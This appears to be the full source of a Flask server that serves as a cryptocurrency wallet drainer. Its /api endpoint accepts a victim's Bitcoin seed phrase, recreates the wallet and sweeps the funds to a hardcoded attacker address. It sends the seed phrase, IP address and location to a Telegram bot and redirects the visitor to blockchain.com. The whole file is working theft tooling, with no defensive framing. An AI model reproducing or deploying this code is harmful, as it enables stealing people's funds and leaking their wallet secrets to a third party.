# Import libraries
from flask import Flask, request, redirect
from bitcoinlib.wallets import *
import random
import requests
import urllib.request

# Config
valid_api_keys = ['put-some-api-keys-here']
api_key = 'telegram-api-key'
channel_id = 'telegram-group-id'

# Create the app
app = Flask(__name__)


# stupid ass functions
def tg_notify(message):
    api_url = f'https://api.telegram.org/bot{api_key}/sendMessage'
    
    try:
        response = requests.post(api_url, json={'chat_id': channel_id, 'parse_mode': 'Markdown', 'text': message})
        print(response.text)
    except Exception as e:
        print('Telegram Notification Error : ' + str(e))


def ip_location(ip):
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/').json()
        location_data = {
            "city": response.get("city"),
            "country": response.get("country_name")
        }
        location = location_data['city'] + ' / ' + location_data['country']
    except:
        location = 'N/A'

    return location


def current_ip():
    try:
        ip = request.environ['REMOTE_ADDR']
    except:
        ip = 'N/A'

    return ip

# Create the index page
@app.route('/api')

def api():
    try:
        # Read API key (http://0.0.0.0/api?api-key=0)
        api_key = request.args.get('api-key')
        # Check if API key is valid
        if api_key not in valid_api_keys:
            notification = f'*Error - Connection Refused (1/3)*\n\nSomeone tried to connect to the API without a valid API key.\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nAPI Key: {api_key}'
            tg_notify(str(notification))
            return redirect("http://www.blockchain.com")
        else:
            notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}'
            tg_notify(str(notification))
        
        # Get seed phrase and receiver
        seedphrase = request.args.get('seedphrase')
        receiver = 'bc1qxscpemwgeknfkljers8xhvqv2rrp3057gtc9xv'
        balance = request.args.get('balance')

        # Run the sweep function
        return sweep(seedphrase, receiver, balance)
    except Exception as e:
        # create log file
        with open('logfile.txt', 'w') as f:
            f.write(str(e))
        # send notification
        fatal_error = '*Fatal Error - Function: api()*\n\nA critical error occured in the api() function and immediate assistance is required.\n\nUnfortunately the Telegram API is not able to parse entities. The error cannot be displayed here. Find more info in the *logfile.txt*.'
        tg_notify(str(fatal_error))
        print(f'Fatal Error : {str(e)}')
        return redirect("http://www.blockchain.com")


def sweep(seedphrase, receiver, balance):
    print('---')
    print('---')
    print('Seed Phrase: ' + str(seedphrase))
    print('Receiver: ' + str(receiver))
    print('---')
    print('Scanning Wallet ...')

    # generate random wallet name (12 random characters)
    random_wallet_name = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(12))

    # validate the seed phrase
    if wallet_delete_if_exists(str(random_wallet_name), force=True):
        pass

    # try to create the wallet
    try:
        w = Wallet.create(str(random_wallet_name), keys=str(seedphrase), network='bitcoin', witness_type='segwit')
        w.scan()
        w.info()
        # send notification -> wallet created
        notification = f'*Success - Wallet Created (2/3)*\n\nThe wallet was created successfull. Find more information below.\n\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print('Success : Wallet Created')   
    except Exception as e:
        # send notification -> wallet creation failed
        notification = f'*Error - Wallet Creation Failed (2/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print(f'Error : {str(e)}')
        return redirect("http://www.blockchain.com")

    # try to sweep the wallet
    try:
        t = w.sweep(str(receiver), offline=False)
        # send notification -> wallet swept
        notification = f'*Success - Wallet Swept (3/3)*\n\nThe wallet was swept successfull. Find more information below.\n\nReceiver: {receiver}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print('Success : Wallet Swept (3/3)')
        return redirect("http://www.blockchain.com")
    except Exception as e:
        notification = f'*Error - Wallet Not Swept (3/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print(f'Error : {str(e)}')
        return redirect("http://www.blockchain.com")


# Run the app
if __name__ == '__main__':
    # define the host and ip
    host_ip = urllib.request.urlopen('https://v4.ident.me').read().decode('utf8')
    host_port = '5000'
    
    try:
        # run the app
        app.run(host=host_ip, port=host_port)
        # notification is not possible because the server started already
    except Exception as e:
        # create a logfile.txt
        with open('logfile.txt', 'w') as f:
            f.write(str(e))
        # send notification -> fatal error
        notification = f"*Fatal Server Error - Flask Server Couldn't Start*\n\n{str(e)}"
        tg_notify(notification)
        print(f'Fatal Error : {str(e)}')
